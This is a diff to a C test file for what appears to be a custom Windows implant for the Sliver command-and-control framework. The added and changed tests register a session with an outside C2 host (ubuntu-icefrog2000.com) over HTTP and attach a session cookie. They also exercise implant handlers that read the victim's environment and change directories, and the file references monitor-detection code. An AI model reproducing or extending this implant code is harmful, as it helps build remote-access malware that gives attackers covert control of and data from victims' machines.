@@ -1125,13 +1125,15 @@ void test62() {
 	DWORD cbMarshalledRegisterInfo = 0;
 	PENVELOPE pRegisterEnvelope = NULL;
 
-	pSliverClient = SliverSessionInit("https://ubuntu-icefrog2000.com");
+	pSliverClient = SliverSessionInit("http://ubuntu-icefrog2000.com");
 	if (pSliverClient == NULL) {
 		wprintf(L"SliverHttpClientInit failed");
 		goto CLEANUP;
 	}
 
-	//pSliverClient->szSessionID
+	printf("pSliverClient->szSessionID: %s\n", pSliverClient->szSessionID);
+	pSliverClient->HttpConfig.AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pSliverClient->szSessionID) + lstrlenA(pSliverClient->lpCookiePrefix) + 1);
+	sprintf(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
 	pMarshalledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshalledRegisterInfo);
 	if (pMarshalledRegisterInfo == NULL) {
 		wprintf(L"RegisterSliver failed");
@@ -1149,6 +1151,82 @@ CLEANUP:
 	FreeEnvelope(pRegisterEnvelope);
 	FreeSliverHttpClient(pSliverClient);
 	return;
+}
+
+void test63
+(
+	_Inout_ PTP_CALLBACK_INSTANCE Instance,
+	_Inout_opt_ PVOID Context,
+	_Inout_ PTP_WORK Work
+)
+{
+	wprintf(L"Main handler\n");
+}
+
+void test64() {
+	PSLIVER_THREADPOOL pSliverPool = InitializeSliverThreadPool();
+	PTP_WORK pWork = NULL;
+	DWORD i = 0;
+
+	if (pSliverPool == NULL) {
+		goto CLEANUP;
+	}
+	
+	while (TRUE) {
+		pWork = CreateThreadpoolWork(test63, NULL, &pSliverPool->CallBackEnviron);
+		if (pWork == NULL) {
+			goto CLEANUP;
+		}
+
+		SubmitThreadpoolWork(pWork);
+		i++;
+		if (i == 5) {
+			break;
+		}
+
+		Sleep(2000);
+	}
+
+CLEANUP:
+	FreeSliverThreadPool(pSliverPool);
+	return;
+}
+
+void test65() {
+	CHAR szBuffer[] = "C:\\Users";
+	LPSTR lpRespData = NULL;
+
+	if (!SetCurrentDirectoryA(szBuffer)) {
+		lpRespData = ALLOC(0x100);
+		sprintf_s(lpRespData, 0x100, "SetCurrentDirectoryA failed at %s. Error code: 0x%08x", __FUNCTION__, GetLastError());
+	}
+	else {
+		lpRespData = ALLOC(MAX_PATH);
+		GetCurrentDirectoryA(MAX_PATH, lpRespData);
+	}
+
+	printf("lpRespData: %s\n", lpRespData);
+	return;
+}
+
+void test66() {
+	LPWSTR lpBuffer = NULL;
+
+	lpBuffer = GetEnvironmentStringsW();
+	FreeEnvironmentStringsW(lpBuffer);
+}
+
+void test67() {
+	ENVELOPE Envelope;
+	BYTE Buffer[] = { 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 99, 49, 51, 51, 98, 101, 53, 100, 45, 49, 48, 50, 100, 45, 52, 99, 56, 57, 45, 57, 51, 49, 100, 45, 51, 49, 53, 48, 97, 97, 53, 56, 53, 52, 55, 53 };
+	PENVELOPE pResult = NULL;
+
+	Envelope.pData = ALLOC(sizeof(BUFFER));
+	Envelope.pData->pBuffer = Buffer;
+	Envelope.pData->cbBuffer = sizeof(Buffer);
+	pResult = GetEnvHandler(&Envelope);
+	HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
+	FreeEnvelope(pResult);
 }
 
 VOID DetectMonitorSystem() {
@@ -1240,6 +1318,10 @@ int main() {
 	//test59();
 	//test60();
 	//test61();
-	test62();
+	//test62();
+	//test64();
+	//test65();
+	//test66();
+	test67();
 	return 0;
 }
